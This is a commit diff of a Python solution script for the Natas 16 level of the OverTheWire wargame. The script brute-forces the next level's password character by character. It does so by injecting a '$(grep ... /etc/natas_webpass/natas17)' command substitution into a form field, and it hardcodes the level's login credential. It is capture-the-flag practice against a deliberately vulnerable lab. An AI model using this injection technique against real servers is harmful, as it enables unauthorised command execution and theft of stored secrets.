52dc85b1761d8a1e108e2e508e28ce3444f01064
Abdullah Taher Anwer Shaikh <abdullah.taher810@gmail.com>
2026-08-03 16:30:35 +0300

    Refactor Natas 16 script for password retrieval

--- Natas/Scripts/Natas 16.py
+++ Natas/Scripts/Natas 16.py
@@ -7,23 +7,23 @@ characters = ascii_lowercase + ascii_uppercase + digits
 username = "natas16"
 password = "Xm6XEeRN3zsGjRDqBPmuqAVV65k7e3Gb"
 
-url = 'http://natas16.natas.labs.overthewire.org/'
+url = 'http://%s.natas.labs.overthewire.org/' %username
 
-session = requests.Session()
-response = session.get(url, auth=(username, password))
+#session = requests.Session()
+#response = session.get(url, auth=(username, password))
 #response = session.post(url, data= {"needle":"anythings$(grep ^b /etc/natas_webpass/natas17)"}, auth=(username, password))
 #content = response.text
 
-seen_password = list()
+seen_password = ""
 while len(seen_password) < 32:
     for character in characters:
-        print ("".join(seen_password) + character)
-        response = session.post(url, data= {"needle":"anythings$(grep ^" + "".join(seen_password) + character + " /etc/natas_webpass/natas17)"}, auth=(username, password))
+        print (f"{seen_password}{character}")
+        response = requests.post(url, data= {"needle":f"anythings$(grep ^{seen_password}{character} /etc/natas_webpass/natas17)"}, auth=(username, password))
         content = response.text
 
         returned = re.findall('<pre>\n(.*)\n</pre>', content)
 
         if (not returned):
-            seen_password.append(character)
+            seen_password+=character
             break
 #print(content)
